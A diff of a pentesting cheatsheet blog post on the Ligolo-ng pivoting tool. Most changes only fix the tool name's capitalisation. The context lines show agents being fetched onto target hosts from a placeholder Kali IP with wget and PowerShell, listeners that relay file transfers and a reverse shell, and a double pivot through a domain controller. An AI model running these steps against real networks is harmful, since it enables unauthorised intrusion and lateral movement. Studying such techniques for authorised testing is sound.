@@ -1,19 +1,19 @@
 ---
 layout: post
-title:  Ligolo-Ng Cheatsheet
-description: Cheatsheet for Ligolo-Ng
+title:  Ligolo-ng Cheatsheet
+description: Cheatsheet for Ligolo-ng
 date:   2024-10-31 09:00:00 +0300
 image:  '/images/21.jpg'
 tags:   [Cheatsheets, Tools, Pivoting]
 ---
 # Table of Contents
-- [Getting Ligolo-Ng](#getting-ligolo-ng)
+- [Getting Ligolo-ng](#getting-ligolo-ng)
 - [Basic Pivot](#basic-pivot)
 - [File Transfer Example with Single Pivot](#file-transfer-example-with-single-pivot)
 - [Reverse Shell Example with Single Pivot](#reverse-shell-example-with-single-pivot)
 - [Easy Double Pivot to Access a Second Internal Network](#easy-double-pivot-to-access-a-second-internal-network)
 
-# Getting Ligolo-Ng
+# Getting Ligolo.ng
 Important Note: Make sure you are always using the same version of Proxy and Agent (For example, both Proxy and Agent must be 0.7.2).
 
 ## Download the binaries manually (Recommended)
@@ -25,7 +25,7 @@ Important Note: Make sure you are always using the same version of Proxy and Age
 - [Linux 64-bits Agent](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz)
 - [Windows 64-bits Agent](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip)
 
-For more information about Ligolo-Ng, visit its official [GitHub Repository](https://github.com/nicocha30/ligolo-ng).
+For more information about Ligolo-ng, visit its official [GitHub Repository](https://github.com/nicocha30/ligolo-ng).
 
 # Alternative with Package Installer
 ```shell
@@ -54,7 +54,7 @@ wget http://<kali_ip>:443/agent
 cd C:\Windows\Temp
 powershell -c iwr http://<kali_ip>:443/agent.exe -OutFile agent.exe
 ```
-Set up Ligolo-Ng on Kali:
+Set up Ligolo-ng on Kali:
 ```shell
 # Create an interface
 sudo ip tuntap add user Vorkharium mode tun ligolo
@@ -68,7 +68,7 @@ ip route list
 sudo chmod +x proxy
 ./proxy -selfcert
 
-# The Ligolo-Ng console will now open (We will interact with it soon)
+# The Ligolo-ng console will now open (We will interact with it soon)
 ```
 
 On the Pivot target, use the agent file to connect to our running proxy:
@@ -82,7 +82,7 @@ chmod +x agent
 
 ```
 
-Now enter the following on the Ligolo-Ng console:
+Now enter the following on the Ligolo-ng console:
 ```shell
 # Enter "session" to show the available sessions
 ligolo-ng » session
@@ -102,10 +102,10 @@ In this example:
 - We previously set up our Pivot Host A, in this case 172.16.150.10.
 - Now we want to move a file from Kali (192.168.45.200) to Host B (172.16.150.20) through our Pivot Host A (172.16.150.10).
 
-To achieve that, we will create a new listener in our active Ligolo-Ng session:
+To achieve that, we will create a new listener in our active Ligolo-ng session:
 ```shell
 # Create new listener - Port 1234 on Kali will be the Port 9001 on the Pivot Host A
-# Enter the following on the running active Kali Ligolo-Ng session
+# Enter the following on the running active Kali Ligolo-ng session
 listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:9001
 
 # Start Python server on Kali using Port 1234
@@ -119,7 +119,7 @@ wget http://172.16.150.10:9001/test.txt
 Following the example above, we will create a new listener, but this time we will use that listener to get a Reverse Shell:
 ```shell
 # Create new listener - Port 1235 on Kali will be the Port 9002 on the Pivot Host A
-# Enter the following on the running active Kali Ligolo-Ng session
+# Enter the following on the running active Kali Ligolo-ng session
 listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:9002
 
 # Start nc listener on Kali Port 1235
@@ -152,19 +152,19 @@ sudo ip link set ligolo2 up
 # Add the second internal network
 sudo ip route add 172.16.200.0/24 dev ligolo2
 
-# On the Ligolo-Ng current session, create a new listener connecting to the Port 11601 of the first session
+# On the Ligolo-ng current session, create a new listener connecting to the Port 11601 of the first session
 listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
 
 # Run the agent.exe to create a connection from the Second Pivot Host to the First Pivot Host
 ./agent.exe --connect 172.16.150.10:11601 -ignore-cert
 
-# On Ligolo-Ng console - Show sessions
+# On Ligolo-ng console - Show sessions
 ligolo-ng » session
 
 # Select the new session created from the Second Pivot Host
 ? Specify a session : 2 # automotors\Administrator@DC01 (Example of the name of the second pivot host)
 
-# Start new Ligolo-Ng session using the new interface "ligolo2" so it won't interfere with the first interface "ligolo"
+# Start new Ligolo-ng session using the new interface "ligolo2" so it won't interfere with the first interface "ligolo"
 [Agent : automotors\Administrator@DC01] » start --tun ligolo2
 
 # Now we can access the second internal network 172.16.200.0/24
